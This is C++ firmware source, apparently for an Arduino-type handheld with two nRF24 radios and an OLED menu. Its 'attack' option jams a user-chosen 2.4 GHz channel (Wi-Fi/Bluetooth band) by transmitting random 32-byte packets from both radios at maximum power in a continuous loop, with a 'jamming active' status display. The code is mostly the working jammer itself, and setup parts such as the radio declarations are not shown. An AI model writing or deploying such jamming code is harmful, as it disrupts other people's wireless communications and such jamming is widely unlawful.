// Config
int nrfspesChannel = 40;
int nrfspesPaLevelIndex = 3;     // MAX
int nrfspesDataRateIndex = 2;    // 2MBPS
unsigned long nrfspesJamDuration = 1000;

int nrfspesSelectedMenu = 0;

const char* menuLabels[] = {"Channel", "PA Level", "Data Rate", "attack"};
const int menuCount = 4;


static const unsigned char image_bluetooth_not_connected_bits[] U8X8_PROGMEM = {0x40,0x00,0xc1,0x00,0x42,0x01,0x44,0x02,0x48,0x04,0x10,0x04,0x20,0x02,0x40,0x00,0xa0,0x00,0x50,0x01,0x48,0x02,0x44,0x04,0x40,0x0a,0x40,0x11,0x80,0x20,0x00,0x00};
static const unsigned char image_wifi_not_connected_bits[] U8X8_PROGMEM = {0x84,0x0f,0x00,0x68,0x30,0x00,0x10,0xc0,0x00,0xa4,0x0f,0x01,0x42,0x30,0x02,0x91,0x40,0x04,0x08,0x85,0x00,0xc4,0x1a,0x01,0x20,0x24,0x00,0x10,0x4a,0x00,0x80,0x15,0x00,0x40,0x20,0x00,0x00,0x42,0x00,0x00,0x85,0x00,0x00,0x02,0x01,0x00,0x00,0x00};


    





void updateRadios() {
  rf24_pa_dbm_e paLevels[] = {RF24_PA_MIN, RF24_PA_LOW, RF24_PA_HIGH, RF24_PA_MAX};
  rf24_datarate_e rates[] = {RF24_250KBPS, RF24_1MBPS, RF24_2MBPS};

  radio1.setPALevel(paLevels[nrfspesPaLevelIndex]);
  radio2.setPALevel(paLevels[nrfspesPaLevelIndex]);
  radio1.setDataRate(rates[nrfspesDataRateIndex]);
  radio2.setDataRate(rates[nrfspesDataRateIndex]);
}

void jamChannelNow(int channel) {
  setColor(225,0,0);
  byte d1[32], d2[32];
  for (int i = 0; i < 32; i++) {
    d1[i] = random(0, 256);
    d2[i] = random(0, 256);
  }



char chanStr[5];
char freqStr[10];

sprintf(chanStr, "%d", channel);
sprintf(freqStr, "%d", 2400 + channel);

u8g2.clearBuffer();
u8g2.setFontMode(1);
u8g2.setBitmapMode(1);

// Icons
u8g2.drawXBMP(4, 5, 14, 16, image_bluetooth_not_connected_bits);
u8g2.drawXBMP(104, 5, 19, 16, image_wifi_not_connected_bits);

// Text layers
u8g2.setFont(u8g2_font_haxrcorp4089_tr);
u8g2.drawStr(33, 16, "jamming active");
u8g2.drawStr(29, 31, "channel:");
u8g2.drawStr(40, 46, chanStr);
u8g2.drawStr(67, 32, freqStr);

u8g2.sendBuffer();


  while (!isPressed(BTN_BACK)) {
    radio1.setChannel(channel);
    radio1.stopListening();
    radio1.write(d1, sizeof(d1));

    radio2.setChannel(channel);
    radio2.stopListening();
    radio2.write(d2, sizeof(d2));
    delayMicroseconds(100);
  }

  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tf);
  u8g2.drawStr(0, 30, "Jamming Stopped.");
  setColor(0,0,0);
  u8g2.sendBuffer();
  delay(1000);
}

void drawjammspeschannelMenu() {
  u8g2.clearBuffer();

  // Box العنوان
  u8g2.setFont(u8g2_font_8x13B_tf);
  u8g2.drawRFrame(10, 5, 108, 18, 3);
  u8g2.setCursor(20, 18);
  u8g2.print("-> ");
  u8g2.print(menuLabels[nrfspesSelectedMenu]);

  // Box القيمة/التفاصيل
  u8g2.drawRFrame(5, 30, 118, 30, 4);
  u8g2.setFont(u8g2_font_7x14B_tf);

  if (nrfspesSelectedMenu == 0) {
    u8g2.setCursor(12, 48);
    u8g2.print("CH: ");
    u8g2.print(nrfspesChannel);
    u8g2.print(" (");
    u8g2.print(2400 + nrfspesChannel);
    u8g2.print(" MHz)");
  } else if (nrfspesSelectedMenu == 1) {
    const char* levels[] = {"MIN", "LOW", "HIGH", "MAX"};
    u8g2.setCursor(35, 48);
    u8g2.print("PA: ");
    u8g2.print(levels[nrfspesPaLevelIndex]);
  } else if (nrfspesSelectedMenu == 2) {
    const char* rates[] = {"250Kbps", "1Mbps", "2Mbps"};
    u8g2.setCursor(30, 48);
    u8g2.print("Rate: ");
    u8g2.print(rates[nrfspesDataRateIndex]);
  } else if (nrfspesSelectedMenu == 3) {
    u8g2.setCursor(20, 46);
    u8g2.print("Press SELECT ");
  }

  u8g2.sendBuffer();
}



void jammspecchannel() {
  drawjammspeschannelMenu();

  if (isPressed(BTN_UP)) {
    nrfspesSelectedMenu = (nrfspesSelectedMenu - 1 + menuCount) % menuCount;
    delay(200);
  }

  if (isPressed(BTN_DOWN)) {
    nrfspesSelectedMenu = (nrfspesSelectedMenu + 1) % menuCount;
    delay(200);
  }

  if (isPressed(BTN_LEFT)) {
    if (nrfspesSelectedMenu == 0) nrfspesChannel = max(nrfspesChannel - 1, 0);
    if (nrfspesSelectedMenu == 1) nrfspesPaLevelIndex = max(nrfspesPaLevelIndex - 1, 0);
    if (nrfspesSelectedMenu == 2) nrfspesDataRateIndex = max(nrfspesDataRateIndex - 1, 0);
    updateRadios();
    delay(150);
  }

  if (isPressed(BTN_RIGHT)) {
    if (nrfspesSelectedMenu == 0) nrfspesChannel = min(nrfspesChannel + 1, 125);
    if (nrfspesSelectedMenu == 1) nrfspesPaLevelIndex = min(nrfspesPaLevelIndex + 1, 3);
    if (nrfspesSelectedMenu == 2) nrfspesDataRateIndex = min(nrfspesDataRateIndex + 1, 2);
    updateRadios();
    delay(150);
  }

  if (isPressed(BTN_SELECT) && nrfspesSelectedMenu == 3) {
    drawjammspeschannelMenu();
    jamChannelNow(nrfspesChannel);
 
  }
}

